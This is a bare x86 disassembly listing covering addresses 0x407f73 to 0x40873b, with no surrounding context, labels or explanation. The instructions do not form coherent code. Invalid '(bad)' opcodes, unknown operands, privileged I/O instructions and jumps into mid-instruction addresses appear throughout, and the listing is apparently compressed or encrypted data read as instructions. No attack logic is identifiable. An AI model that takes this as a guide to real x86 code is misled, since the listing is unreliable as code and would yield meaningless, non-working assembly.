  407f73:	pop    esi
  407f74:	mov    ecx,0x22c0f9ae
  407f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f7a:	nop
  407f7b:	xlat   BYTE PTR ds:[ebx]
  407f7c:	push   edx
  407f7d:	xor    BYTE PTR [esp+ecx*1-0x419152a],dl
  407f84:	fisubr DWORD PTR [eax+0x39]
  407f87:	stos   DWORD PTR es:[edi],eax
  407f88:	iret   
  407f89:	inc    eax
  407f8a:	sbb    sp,ax
  407f8d:	out    0x80,eax
  407f8f:	push   0x987103c2
  407f94:	(bad)  
  407f95:	in     al,0x9f
  407f97:	mov    ah,0x5d
  407f99:	dec    edi
  407f9a:	out    0xd5,al
  407f9c:	out    0x9f,al
  407f9e:	pop    ss
  407f9f:	xor    al,0x40
  407fa1:	popa   
  407fa2:	add    al,ah
  407fa4:	in     eax,0x4
  407fa6:	xchg   BYTE PTR [ebx+0x4d],al
  407fa9:	push   esi
  407faa:	mov    WORD PTR [esi+0x14],cs
  407fad:	fsubr  QWORD PTR [esi-0x53]
  407fb0:	xchg   ebp,eax
  407fb1:	push   ebp
  407fb2:	int    0x4
  407fb4:	pop    ebx
  407fb5:	int    0xf9
  407fb7:	dec    ebx
  407fb8:	or     BYTE PTR [ebp-0x52],dh
  407fbb:	xor    eax,0x1bcdde3
  407fc0:	pop    ebp
  407fc1:	xchg   BYTE PTR ss:[edi*4+0x35c1cd3b],dl
  407fc9:	loope  0x407fad
  407fcb:	(bad)  
  407fcc:	xor    eax,DWORD PTR [ebp+0x51bb37b9]
  407fd2:	repz cli 
  407fd4:	mov    DWORD PTR [edx],esi
  407fd6:	sbb    al,0x7
  407fd8:	sub    cl,al
  407fda:	sub    esi,ecx
  407fdc:	cli    
  407fdd:	les    esp,FWORD PTR [esp+ebx*2-0x794924e6]
  407fe4:	sbb    edx,DWORD PTR [ebx+0xe13e32f]
  407fea:	pushf  
  407feb:	fsub   QWORD PTR [edx]
  407fed:	pcmpgtw mm6,QWORD PTR [esp+eax*8+0x1fddb00f]
  407ff5:	add    BYTE PTR [esp+ebp*8-0x6b42e8f8],al
  407ffc:	and    al,BYTE PTR [eax-0x22]
  407fff:	adc    eax,0xff33127c
  408004:	xchg   esi,eax
  408005:	aas    
  408006:	das    
  408007:	xor    eax,0x6e5d409d
  40800c:	and    edi,DWORD PTR [eax+0x35]
  40800f:	or     ah,BYTE PTR [esi+0x78]
  408012:	mov    ds:0x8276edf0,eax
  408017:	jl     0x407fe1
  408019:	xor    dh,BYTE PTR [ecx+0x6d25a65c]
  40801f:	pop    ss
  408020:	and    ecx,DWORD PTR [esi-0x4a]
  408023:	ins    DWORD PTR es:[edi],dx
  408024:	popf   
  408025:	push   ds
  408026:	xor    dl,bh
  408028:	and    eax,0x76f5497a
  40802d:	push   ecx
  40802f:	sub    ebp,edi
  408031:	xor    eax,DWORD PTR [eax-0x10d251df]
  408037:	push   ebp
  408038:	xchg   ebp,eax
  408039:	sub    eax,0x51a41357
  40803e:	sub    dl,ch
  408040:	dec    ecx
  408041:	sub    al,BYTE PTR [eax-0x1f]
  408044:	mov    DWORD PTR [edx+0x7e],ecx
  408047:	and    eax,0x1b0855d0
  40804c:	cmp    edx,eax
  40804e:	(bad)  
  40804f:	sbb    ah,BYTE PTR [edx+0x6d]
  408052:	std    
  408053:	add    BYTE PTR [esp+edi*8],cl
  408056:	adc    ecx,DWORD PTR [ecx-0x21]
  408059:	aad    0x7a
  40805b:	xor    eax,0x6fcda684
  408060:	xor    dh,BYTE PTR [eax+0x2fdbbc9e]
  408066:	xchg   ebp,eax
  408067:	cmp    al,BYTE PTR [edx+0x1e]
  40806a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40806b:	sbb    DWORD PTR [eax],eax
  40806d:	ss xor esi,esi
  408070:	pop    edx
  408071:	addr16 push esi
  408073:	add    BYTE PTR [ebx],dl
  408075:	pop    ebp
  408076:	imul   edi,DWORD PTR [ebp+0x46],0xffffffdb
  40807a:	sahf   
  40807b:	adc    dl,BYTE PTR [ecx-0x351b625e]
  408081:	xor    ah,ch
  408083:	inc    edx
  408084:	int    0x88
  408086:	push   ecx
  408087:	and    DWORD PTR [ebp+0x10ce1921],esp
  40808d:	arpl   WORD PTR [ecx-0x6e],bp
  408090:	fdivr  DWORD PTR [ebx]
  408092:	mov    ds:0x5b083a9d,al
  408097:	repz push esp
  408099:	fdiv   QWORD PTR gs:[esi-0x49]
  40809d:	mov    eax,0xfe01af71
  4080a2:	arpl   si,dx
  4080a4:	int    0x22
  4080a6:	pop    ss
  4080a7:	pop    edx
  4080a8:	js     0x40803c
  4080aa:	dec    ecx
  4080ab:	adc    BYTE PTR ds:0x71b58442,ch
  4080b1:	stc    
  4080b2:	outs   dx,BYTE PTR ds:[esi]
  4080b3:	cmp    ebx,DWORD PTR [esp+esi*1+0x7fa7c8e9]
  4080ba:	(bad)  
  4080bb:	jp     0x408078
  4080bd:	cmp    bl,BYTE PTR [edi+0x2c]
  4080c0:	pop    esi
  4080c1:	int3   
  4080c2:	xlat   BYTE PTR ds:[ebx]
  4080c3:	hlt    
  4080c4:	icebp  
  4080c5:	xlat   BYTE PTR ds:[ebx]
  4080c6:	jp     0x40809f
  4080c8:	add    edx,DWORD PTR ds:0x9769c7c0
  4080ce:	stos   BYTE PTR es:[edi],al
  4080cf:	and    ecx,DWORD PTR [esi]
  4080d1:	jle    0x4080f8
  4080d3:	loope  0x4080b9
  4080d5:	dec    esi
  4080d6:	push   ds
  4080d7:	cmp    al,0xb8
  4080d9:	and    al,ch
  4080db:	lock jno 0x408089
  4080de:	imul   esi,DWORD PTR [ebp+0x7a6c2f0],0x65
  4080e5:	out    0x45,eax
  4080e7:	fisttp QWORD PTR [edx-0x25c56d4f]
  4080ed:	jp     0x4080a0
  4080ef:	arpl   WORD PTR [ebx+ebx*2+0x344a755e],sp
  4080f6:	lds    esi,FWORD PTR [ebx+0x2e]
  4080f9:	pop    ds
  4080fa:	push   0xbc62497f
  4080ff:	jle    0x408082
  408101:	out    dx,al
  408102:	jo     0x40811a
  408104:	out    0xfc,al
  408106:	daa    
  408107:	jp     0x4080ae
  408109:	in     al,0x6c
  40810b:	add    BYTE PTR [esi-0x36],0x87
  40810f:	into   
  408110:	sub    al,0xd5
  408112:	xchg   ebx,eax
  408113:	adc    ebx,edi
  408115:	fadd   DWORD PTR [edx]
  408117:	cld    
  408118:	push   edx
  408119:	cmp    esp,DWORD PTR [eax]
  40811b:	or     ah,BYTE PTR [ebp+0x26]
  40811e:	cwde   
  40811f:	fnstcw WORD PTR gs:[ecx]
  408122:	and    dh,BYTE PTR [ebx]
  408124:	xchg   edi,eax
  408125:	xchg   edx,eax
  408126:	pop    ds
  408127:	dec    ebx
  408128:	dec    edi
  408129:	inc    esi
  40812a:	retf   0xc7af
  40812d:	in     al,0xad
  40812f:	sbb    ebp,esi
  408131:	fsub   st(5),st
  408133:	mov    ds:0x9cb1a5a9,al
  408138:	out    dx,al
  408139:	sub    eax,0xf844fc50
  40813e:	iret   
  40813f:	repz scas al,BYTE PTR es:[edi]
  408141:	retf   
  408142:	les    eax,FWORD PTR [ebx+ebx*2]
  408145:	(bad)  
  408146:	ror    BYTE PTR [edi+0x153e382],1
  40814c:	pop    ecx
  40814d:	outs   dx,BYTE PTR ds:[esi]
  40814e:	fwait
  40814f:	out    dx,al
  408150:	adc    eax,0x9ef3d03c
  408155:	test   ah,cl
  408157:	das    
  408158:	(bad)  
  408159:	lock stc 
  40815b:	ja     0x40810a
  40815d:	fist   DWORD PTR [ebx+0x56]
  408160:	div    DWORD PTR [ebp+0x20]
  408163:	outs   dx,BYTE PTR ds:[esi]
  408164:	out    dx,al
  408165:	pop    ebp
  408166:	js     0x408198
  408168:	xchg   BYTE PTR [ebx],ch
  40816a:	jle    0x40811f
  40816c:	inc    esp
  40816d:	addr16 add al,0x7c
  408170:	cmp    esi,DWORD PTR [ebp+0x567e1fe7]
  408176:	mov    esp,0xcb41b4f1
  40817b:	pop    edx
  40817c:	xchg   ebp,eax
  40817d:	cdq    
  40817e:	das    
  40817f:	sub    al,0xba
  408181:	in     eax,dx
  408182:	out    dx,al
  408183:	shl    DWORD PTR [edi-0x26e0567e],cl
  408189:	dec    ecx
  40818a:	ss sti 
  40818c:	adc    al,0xbc
  40818e:	shl    BYTE PTR [ebx],0x0
  408191:	xchg   BYTE PTR [edi-0x49],dl
  408194:	and    ah,BYTE PTR [ebx-0x3]
  408197:	neg    esi
  408199:	pop    edi
  40819a:	ret    0xb364
  40819d:	mov    ah,0x6d
  40819f:	push   ds
  4081a0:	mov    al,ds:0x34b6b240
  4081a5:	loop   0x408211
  4081a7:	dec    eax
  4081a8:	scas   al,BYTE PTR es:[edi]
  4081a9:	xchg   BYTE PTR [ebx],dl
  4081ab:	inc    edi
  4081ac:	mov    bh,0x35
  4081ae:	xlat   BYTE PTR ds:[ebx]
  4081af:	jle    0x4081f1
  4081b1:	lods   al,BYTE PTR ds:[esi]
  4081b2:	sbb    BYTE PTR [ecx+0x7f],dh
  4081b5:	lea    ecx,[ebp-0x1a]
  4081b8:	jmp    0xe70c:0x376ac7d5
  4081bf:	mov    al,0x79
  4081c1:	scas   eax,DWORD PTR es:[edi]
  4081c2:	leave  
  4081c3:	jg     0x40820d
  4081c5:	retf   
  4081c6:	es jmp 0x408164
  4081c9:	dec    esi
  4081cb:	jns    0x40816e
  4081cd:	mov    BYTE PTR [eax+0x77c7e507],ah
  4081d3:	out    dx,eax
  4081d4:	dec    eax
  4081d5:	push   esp
  4081d6:	fwait
  4081d7:	xor    BYTE PTR [edx],ah
  4081d9:	jne    0x40819e
  4081db:	out    0xa,eax
  4081dd:	imul   eax,DWORD PTR [eax],0x65
  4081e0:	addr16 dec ebp
  4081e2:	je     0x40818c
  4081e4:	mov    edi,0x2a6f5c5b
  4081e9:	fs fmulp st(2),st
  4081ec:	lock es into 
  4081ef:	sti    
  4081f0:	push   0x4aa528fd
  4081f5:	push   ds
  4081f6:	xchg   ebx,eax
  4081f7:	call   0x61a65cc
  4081fc:	cmp    dh,BYTE PTR ds:0x943aef45
  408202:	mov    al,0xcf
  408204:	in     al,dx
  408205:	mov    eax,0xf913c61b
  40820a:	ins    DWORD PTR es:[edi],dx
  40820b:	ret    0x4710
  40820e:	mov    ecx,0x28f83cf6
  408213:	(bad)  
  408214:	xlat   BYTE PTR ds:[ebx]
  408215:	xchg   ax,ax
  408217:	cmp    BYTE PTR [edi-0x21],cl
  40821a:	and    esp,DWORD PTR [edi+eiz*4+0x24deb16b]
  408221:	mov    al,0x86
  408223:	das    
  408224:	mov    al,ds:0xdd62f540
  408229:	lds    ebp,FWORD PTR [esi+0xe12c892]
  40822f:	cmp    esi,DWORD PTR [eax+0x2fb0c925]
  408235:	fs add dh,bl
  408238:	sub    BYTE PTR [ecx+0x5e],bl
  40823b:	mov    dl,0x88
  40823d:	jl     0x4081ca
  40823f:	call   0x9a42:0xb721ca65
  408246:	cwde   
  408247:	mov    al,0x57
  408249:	push   esp
  40824a:	pop    edi
  40824b:	sar    al,1
  40824d:	push   edi
  40824e:	sbb    DWORD PTR [edx-0x42],ebx
  408251:	mov    edi,0xae5bdea7
  408256:	addr16 dec edi
  408258:	mov    eax,0x8a8c349a
  40825d:	add    al,0x32
  40825f:	mov    ds:0x559b5652,al
  408264:	push   edi
  408265:	push   0x33f6f3f0
  40826a:	and    DWORD PTR [ecx+ebp*2+0x1f],eax
  40826e:	and    DWORD PTR [ecx+ebp*2+0x1f],ebx
  408272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408273:	outs   dx,DWORD PTR ds:[si]
  408275:	dec    eax
  408276:	push   0x2a313343
  40827b:	leave  
  40827c:	add    bl,dl
  40827e:	dec    esp
  40827f:	jmp    DWORD PTR ds:0xc8d40170
  408285:	mov    al,0xbb
  408287:	ds jg  0x4082b7
  40828a:	jg     0x408249
  40828c:	mov    ds:0xde6b7a3e,eax
  408291:	add    bh,BYTE PTR [ebp+0x7c]
  408294:	out    dx,eax
  408295:	jecxz  0x4082ee
  408297:	ins    DWORD PTR es:[edi],dx
  408298:	ins    DWORD PTR es:[edi],dx
  408299:	(bad)
  40829d:	fild   WORD PTR [ebx]
  40829f:	cld    
  4082a0:	xchg   DWORD PTR [ecx],esi
  4082a2:	mov    al,0xea
  4082a4:	push   ss
  4082a5:	adc    al,0x50
  4082a7:	ja     0x4082b2
  4082a9:	in     eax,0x4b
  4082ab:	jae    0x4082d9
  4082ad:	push   esi
  4082ae:	cmp    ah,al
  4082b0:	push   es
  4082b1:	push   ds
  4082b2:	ds stos DWORD PTR es:[edi],eax
  4082b4:	sahf   
  4082b5:	add    BYTE PTR [ebp+0x27],dh
  4082b8:	dec    esp
  4082b9:	mov    ss,WORD PTR [esi]
  4082bb:	mov    cl,0x21
  4082bd:	int3   
  4082be:	jle    0x408316
  4082c0:	xor    DWORD PTR [eax+0x6],ecx
  4082c3:	pop    edx
  4082c4:	jle    0x40830e
  4082c6:	pop    ebp
  4082c7:	in     eax,dx
  4082c8:	inc    esi
  4082c9:	test   DWORD PTR es:[ecx+eax*2+0x49593b1f],ebp
  4082d1:	cmp    bh,BYTE PTR [ecx]
  4082d3:	add    esi,DWORD PTR [edx-0x41]
  4082d6:	shl    ecx,1
  4082d8:	pop    ecx
  4082d9:	jae    0x408268
  4082db:	or     ebp,edi
  4082dd:	int3   
  4082de:	mov    cl,0x1e
  4082e0:	fbstp  TBYTE PTR [ecx]
  4082e2:	jb     0x408354
  4082e4:	mov    al,ds:0xbd758929
  4082e9:	xor    BYTE PTR [eax+0x3],dh
  4082ec:	mov    ecx,0xe07d423
  4082f1:	inc    BYTE PTR [edi-0x15b687cc]
  4082f7:	nop
  4082f8:	pop    eax
  4082f9:	imul   DWORD PTR [eax+edi*8-0x44]
  4082fd:	hlt    
  4082fe:	nop
  4082ff:	push   ds
  408300:	into   
  408301:	data16 mov cl,0x23
  408304:	cmp    bl,ah
  408306:	jo     0x408313
  408308:	fwait
  408309:	jb     0x40836c
  40830b:	das    
  40830c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40830d:	pop    ds
  40830e:	imul   DWORD PTR [ecx-0x5c]
  408311:	fadd   st(7),st
  408313:	test   eax,0x76bb8629
  408318:	xor    DWORD PTR [eax],ecx
  40831a:	mov    dh,0xbe
  40831c:	fist   WORD PTR [ebx]
  40831e:	jo     0x408373
  408320:	and    eax,0xda1fecc4
  408325:	jge    0x40833a
  408327:	stos   BYTE PTR es:[edi],al
  408328:	aad    0x80
  40832a:	hlt    
  40832b:	cwde   
  40832c:	loop   0x4082ff
  40832e:	call   FWORD PTR [edx]
  408330:	pop    ecx
  408331:	imul   eax,DWORD PTR [ebx+0x10284f0f],0x6b3de3e6
  40833b:	mov    ds:0x7ee59d39,eax
  408341:	inc    esp
  408342:	jmp    0xedb9:0xa7ba7c63
  408349:	xchg   esp,eax
  40834a:	cs push ds
  40834c:	sbb    eax,0x4b4f4040
  408351:	fldenv [esi-0x4c]
  408354:	sar    BYTE PTR [eax],cl
  408356:	cs fdivrp st(3),st
  408359:	ins    BYTE PTR es:[edi],dx
  40835a:	jge    0x408302
  40835c:	xlat   BYTE PTR ds:[ebx]
  40835d:	push   ss
  40835e:	sbb    BYTE PTR [ebp+eax*2-0x25],0x69
  408363:	pop    eax
  408364:	mov    ch,0x22
  408366:	fwait
  408367:	popa   
  408368:	cwde   
  408369:	ins    BYTE PTR es:[edi],dx
  40836a:	push   edi
  40836b:	xchg   ecx,eax
  40836c:	mov    ds:0xe9b7e685,eax
  408371:	adc    BYTE PTR [ebp-0x47],bl
  408374:	adc    DWORD PTR [ebp-0x4d4e5426],edx
  40837a:	dec    ebp
  40837b:	jae    0x408303
  40837d:	rcl    cl,cl
  40837f:	(bad)  
  408380:	cdq    
  408381:	pop    eax
  408382:	sub    BYTE PTR [edi+0x4247a9d2],cl
  408388:	scas   eax,DWORD PTR es:[edi]
  408389:	sti    
  40838a:	ret    
  40838b:	test   eax,0x406263cc
  408390:	(bad)  
  408391:	call   0x260c67c9
  408396:	xor    edx,DWORD PTR [edx-0x58]
  408399:	cmp    ecx,ecx
  40839b:	adc    eax,0xfa0385b7
  4083a0:	cmp    BYTE PTR [ecx+0x9eaf8f3],bh
  4083a6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4083a8:	or     BYTE PTR [ebx+0x1a],cl
  4083ab:	popa   
  4083ac:	imul   esp,DWORD PTR [ebx+0x71],0x1e
  4083b0:	stc    
  4083b1:	jecxz  0x4083c6
  4083b3:	add    esp,eax
  4083b5:	pop    ebx
  4083b6:	cwde   
  4083b7:	dec    esi
  4083b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083b9:	fcmove st,st(3)
  4083bb:	fdivp  st(5),st
  4083bd:	pusha  
  4083be:	push   es
  4083bf:	and    DWORD PTR [ecx],esp
  4083c1:	lea    ecx,[edi+edi*1]
  4083c4:	daa    
  4083c5:	xchg   edx,eax
  4083c6:	and    al,0x7c
  4083c8:	xor    BYTE PTR [ebx-0x18],al
  4083cb:	xchg   edx,eax
  4083cc:	sub    eax,0x85baff45
  4083d1:	mov    ?,WORD PTR [ebp+0x11]
  4083d4:	pop    esp
  4083d5:	in     eax,dx
  4083d6:	loopne 0x408400
  4083d8:	cdq    
  4083d9:	cmp    DWORD PTR [edi-0x115a870],ebx
  4083df:	xor    dl,BYTE PTR [ecx+0x1639de33]
  4083e5:	jbe    0x40842a
  4083e7:	sbb    ah,BYTE PTR [esi-0x4f]
  4083ea:	stos   DWORD PTR es:[edi],eax
  4083eb:	push   esi
  4083ec:	arpl   WORD PTR [ebp-0x374ebebf],di
  4083f2:	(bad)  
  4083f3:	pop    ds
  4083f4:	ds push ds
  4083f6:	out    0x1d,al
  4083f8:	inc    esp
  4083f9:	iret   
  4083fa:	imul   ebp,DWORD PTR [ecx],0x40
  4083fd:	fxch   st(0)
  4083ff:	(bad)  
  408400:	mov    eax,?
  408402:	fadd   QWORD PTR [ecx+0x33b9eeee]
  408408:	clc    
  408409:	into   
  40840a:	(bad)  
  40840b:	jp     0x40843b
  40840d:	mov    ah,0x1c
  40840f:	mov    edi,0xf5b78a00
  408414:	sub    dl,ch
  408416:	out    0x2c,eax
  408418:	fcomi  st,st(2)
  40841a:	jns    0x40842b
  40841c:	js     0x40842c
  40841e:	mov    eax,0x694036ba
  408423:	or     DWORD PTR [ecx+0x6ce21aef],esp
  408429:	loop   0x4083b3
  40842b:	pop    es
  40842c:	mov    ah,ah
  40842e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40842f:	bound  edi,QWORD PTR [ecx-0x1b94d9b2]
  408435:	sbb    ah,BYTE PTR [edx-0x42c82087]
  40843b:	sub    BYTE PTR [ecx-0x198297be],al
  408441:	imul   BYTE PTR [ebx-0x22]
  408444:	fwait
  408445:	je     0x408415
  408447:	lea    esp,[esi-0x1a]
  40844a:	sub    bh,ah
  40844c:	jo     0x4083ec
  40844e:	lods   eax,DWORD PTR ds:[esi]
  40844f:	dec    esp
  408450:	js     0x4083f2
  408452:	lods   al,BYTE PTR ds:[esi]
  408453:	mov    eax,ds:0x8c726f05
  408458:	inc    edx
  408459:	call   0x503560c9
  40845e:	pop    ebp
  40845f:	xchg   esi,eax
  408460:	mov    esp,0x9110ef89
  408465:	xchg   esp,eax
  408466:	rol    BYTE PTR [ebx-0xb],0x53
  40846a:	push   eax
  40846b:	rcl    DWORD PTR [edx+edx*1-0x7540ba56],cl
  408472:	mov    al,0x55
  408474:	bswap  esi
  408476:	sbb    al,0xb4
  408478:	jecxz  0x408401
  40847a:	cmp    BYTE PTR [ebp+0x158f22c4],dh
  408480:	popa   
  408481:	outs   dx,BYTE PTR ds:[esi]
  408482:	je     0x4084fd
  408484:	scas   eax,DWORD PTR es:[edi]
  408485:	pop    ebx
  408486:	cli    
  408487:	jg     0x4084ce
  408489:	mov    ah,0x2e
  40848b:	ret    
  40848c:	xchg   ebp,eax
  40848d:	rcl    BYTE PTR [esi-0x29267ab5],cl
  408493:	popa   
  408494:	mov    dl,0x80
  408496:	sbb    dh,dh
  408498:	pop    edi
  408499:	push   esi
  40849a:	add    BYTE PTR [ebp+0x23],dh
  40849d:	add    ebp,DWORD PTR [eax+0x2514d739]
  4084a3:	jnp    0x4084ab
  4084a5:	das    
  4084a6:	fld    TBYTE PTR [edi]
  4084a8:	jns    0x408465
  4084aa:	push   ebp
  4084ab:	fstp   DWORD PTR [edi+0x18]
  4084ae:	or     DWORD PTR [ebp+0x417cf89],0xffffffba
  4084b5:	setno  BYTE PTR [esp+ecx*1+0x0]
  4084ba:	in     al,dx
  4084bb:	and    al,0x1
  4084bd:	xor    al,0x88
  4084bf:	sub    al,0x31
  4084c1:	out    dx,eax
  4084c2:	cmp    BYTE PTR ds:[ebp-0x3ded0ad3],bh
  4084c9:	retf   
  4084ca:	inc    ecx
  4084cb:	push   es
  4084cc:	push   edx
  4084cd:	lds    esi,FWORD PTR [edi+0x53]
  4084d0:	mov    cl,0x27
  4084d2:	jo     0x40850a
  4084d4:	push   ebp
  4084d5:	lds    ebx,FWORD PTR [ebp+0x23]
  4084d8:	es jg  0x40847b
  4084db:	mov    eax,0x6cef87dc
  4084e0:	xor    eax,0x51c842f8
  4084e5:	and    al,BYTE PTR [esi]
  4084e7:	push   ebx
  4084e8:	or     al,bl
  4084ea:	loope  0x4084c7
  4084ec:	mov    al,0x11
  4084ee:	mov    ebx,0xf5647ba7
  4084f3:	in     al,dx
  4084f4:	mov    ss,eax
  4084f6:	mov    cl,0x9e
  4084f8:	repnz inc edx
  4084fa:	jo     0x408510
  4084fc:	shl    BYTE PTR [ebx-0xc95e8dd],0xf6
  408503:	dec    ebx
  408504:	dec    ebp
  408505:	bound  esi,QWORD PTR [ebx-0x3d4f12d9]
  40850b:	cmp    al,0xc0
  40850d:	retf   0x9b80
  408510:	cdq    
  408511:	test   eax,0x4cfd0ff1
  408516:	adc    ebx,DWORD PTR [ecx+0x4f]
  408519:	add    eax,0xec10c067
  40851e:	sub    eax,0x325d8b06
  408523:	fld    QWORD PTR [eax+0x5e]
  408526:	(bad)  
  408527:	or     edx,esi
  408529:	imul   esp,edx,0xecaba38f
  40852f:	mov    BYTE PTR [esi],dh
  408531:	jb     0x408561
  408533:	sbb    eax,0xd763278a
  408538:	sub    al,0x1f
  40853a:	fcmovnbe st,st(2)
  40853c:	and    ah,BYTE PTR [esi-0x17bfbcb5]
  408542:	retf   0x3625
  408545:	popa   
  408546:	xlat   BYTE PTR ds:[ebx]
  408547:	lock (bad) 
  408549:	(bad)  
  40854a:	xchg   ecx,eax
  40854b:	or     edx,DWORD PTR [ebx+0x38b0c2ca]
  408551:	dec    ecx
  408552:	cwde   
  408553:	ins    BYTE PTR es:[edi],dx
  408554:	jmp    0x4085c8
  408556:	jne    0x4084f4
  408558:	sub    BYTE PTR [edx+0x663e604],bl
  40855e:	mov    al,ds:0xa93bae0f
  408563:	pusha  
  408564:	ins    BYTE PTR es:[edi],dx
  408565:	pop    esi
  408566:	jae    0x408599
  408568:	test   eax,0x694ccc6d
  40856d:	and    al,0xad
  40856f:	xchg   ecx,eax
  408570:	data16 jp 0x40851d
  408573:	scas   al,BYTE PTR es:[edi]
  408574:	adc    dl,BYTE PTR [edi+0x2f]
  408577:	jecxz  0x4085b7
  408579:	add    eax,0xde8c4746
  40857e:	fiadd  DWORD PTR [edx+0x438ad658]
  408584:	cmp    eax,0xce15a6ee
  408589:	and    eax,0xea7b2ab8
  40858e:	xor    al,0x4a
  408590:	out    0xf4,al
  408592:	nop
  408593:	aad    0x4a
  408595:	sar    edi,1
  408597:	adc    eax,0xd3c43625
  40859c:	jne    0x4085f0
  40859e:	ret    
  40859f:	or     eax,0xa206af4f
  4085a4:	add    al,0xb5
  4085a6:	rol    BYTE PTR [esp+edi*8-0x5],1
  4085aa:	dec    ebx
  4085ab:	jno    0x4085a7
  4085ad:	in     al,dx
  4085ae:	inc    eax
  4085af:	mov    BYTE PTR [edx+eax*4+0x3b4ab481],bl
  4085b6:	mov    BYTE PTR [eax+0x50663d9d],cl
  4085bc:	mov    ecx,0x51064210
  4085c1:	xchg   bh,al
  4085c3:	out    0x52,al
  4085c5:	jb     0x4085c8
  4085c7:	cwde   
  4085c8:	out    dx,eax
  4085c9:	loop   0x4085a1
  4085cb:	in     eax,dx
  4085cc:	int3   
  4085cd:	comiss xmm0,xmm3
  4085d0:	ror    DWORD PTR [ebp+ebx*4+0x525c8d93],0x34
  4085d8:	rol    ebp,cl
  4085da:	push   ds
  4085db:	loop   0x408647
  4085dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085de:	test   BYTE PTR [edx],ch
  4085e0:	push   ecx
  4085e1:	dec    edx
  4085e2:	mov    ebp,ecx
  4085e4:	loopne 0x408577
  4085e6:	push   cs
  4085e7:	jae    0x40864e
  4085e9:	mov    ebx,eax
  4085eb:	aad    0x7c
  4085ed:	mov    dl,0xcf
  4085ef:	sub    ebp,DWORD PTR fs:[eax-0x5e636ce5]
  4085f6:	cmp    BYTE PTR ds:0xcfd1f114,dh
  4085fc:	ja     0x408605
  4085fe:	sbb    al,0xc7
  408600:	adc    al,BYTE PTR [edx-0x59b99f8]
  408606:	or     bl,BYTE PTR [eax-0x53]
  408609:	lods   eax,DWORD PTR ds:[esi]
  40860a:	mov    ah,0xf2
  40860c:	jl     0x4085b7
  40860e:	sar    DWORD PTR [edx],0xb5
  408611:	dec    esp
  408612:	jnp    0x40859a
  408614:	inc    esi
  408615:	cmc    
  408616:	push   0x5b018e4a
  40861b:	enter  0x7615,0x58
  40861f:	jns    0x40862c
  408621:	jno    0x4085af
  408623:	jmp    0x408699
  408625:	pop    esi
  408626:	cli    
  408627:	retf   0x350
  40862a:	sti    
  40862b:	loop   0x4085c8
  40862d:	xor    ebx,ebp
  40862f:	cmp    al,0xab
  408631:	pop    esp
  408632:	xor    BYTE PTR [edx+ecx*1],bh
  408635:	bts    DWORD PTR ds:0x6e10d59d,edi
  40863c:	adc    ah,BYTE PTR [esi-0xd]
  40863f:	inc    edi
  408640:	cli    
  408641:	push   ebx
  408642:	mov    BYTE PTR [edi],0x8e
  408645:	jge    0x4086b6
  408647:	dec    edx
  408648:	xor    dh,0x40
  40864b:	sar    ebx,0x53
  40864e:	or     eax,0x14983bc8
  408653:	cmp    BYTE PTR [ebp+esi*4-0x65746a6c],ch
  40865a:	dec    edi
  40865b:	sub    eax,0xa4f72de
  408660:	xor    edx,eax
  408662:	fistp  QWORD PTR [edx]
  408664:	jne    0x40869f
  408666:	stos   DWORD PTR es:[edi],eax
  408667:	fmul   st(6),st
  408669:	test   eax,0xadcfc85e
  40866e:	(bad)  
  40866f:	shl    BYTE PTR ds:0x47cf3ab8,0x1b
  408676:	fstp   TBYTE PTR gs:[ecx+0x3a]
  40867a:	jns    0x408621
  40867c:	or     BYTE PTR [ebx-0x35a30dea],0x77
  408683:	hlt    
  408684:	mov    ds:0x49cad47f,al
  408689:	push   ecx
  40868a:	pmullw mm6,QWORD PTR [edx+0x3c]
  40868e:	jbe    0x4086aa
  408690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408691:	loope  0x4086b4
  408693:	mov    dl,0xa5
  408695:	add    eax,0xe6b7472b
  40869a:	shl    DWORD PTR [esi+0xebd718d],1
  4086a0:	mov    edx,0x6c273707
  4086a5:	stos   BYTE PTR es:[edi],al
  4086a6:	mov    ch,0x21
  4086a8:	in     al,0x5a
  4086aa:	xor    edx,DWORD PTR [ecx]
  4086ac:	leave  
  4086ad:	xor    DWORD PTR [esi+0x52bfabec],esp
  4086b3:	imul   eax,DWORD PTR [eax-0x31],0x82692235
  4086ba:	jae    0x4086bb
  4086bc:	je     0x40864d
  4086be:	out    0x2b,eax
  4086c0:	and    al,0x16
  4086c2:	push   esi
  4086c3:	mov    eax,0x8c133abf
  4086c8:	dec    edx
  4086c9:	sub    esi,edi
  4086cb:	jle    0x408710
  4086cd:	and    DWORD PTR [eax-0x24],esi
  4086d0:	mov    dl,0x65
  4086d2:	stc    
  4086d3:	xor    al,BYTE PTR [edi+ebp*2-0x3fb82b2c]
  4086da:	add    eax,DWORD PTR [ecx]
  4086dc:	rcr    BYTE PTR [esi-0x20],1
  4086df:	add    BYTE PTR [edx-0x5f],bl
  4086e2:	and    edi,DWORD PTR [edi-0x7e]
  4086e5:	mov    edi,0x616355ce
  4086ea:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4086ec:	push   cs
  4086ed:	and    BYTE PTR [eax+ebp*4-0x38],0x97
  4086f2:	pusha  
  4086f3:	sbb    eax,0x8728ebd3
  4086f8:	xor    eax,ecx
  4086fa:	aad    0x16
  4086fc:	add    eax,0x471f268c
  408701:	mov    edx,0x1926148a
  408706:	mov    edx,0x119db26
  40870b:	dec    esi
  40870c:	dec    edx
  40870d:	(bad)  
  40870e:	int    0xed
  408710:	cmp    al,0x77
  408712:	pop    esi
  408713:	add    edi,esp
  408715:	inc    esp
  408716:	push   ecx
  408717:	inc    eax
  408718:	sbb    esi,esi
  40871a:	pop    ecx
  40871b:	sbb    BYTE PTR [ecx-0x5eac0ad5],ah
  408721:	bound  eax,QWORD PTR [ebx-0x6fc3bd0d]
  408727:	jne    0x40875d
  408729:	mov    dl,0xec
  40872b:	sbb    BYTE PTR [edx+ebx*1+0x55],0x7e
  408730:	push   ss
  408731:	mov    ebx,eax
  408733:	gs addr16 popa 
  408736:	cwde   
  408737:	xchg   ecx,eax
  408738:	inc    ebx
  408739:	aad    0xe6
  40873b:	xor    BYTE PTR [edi-0x74],cl
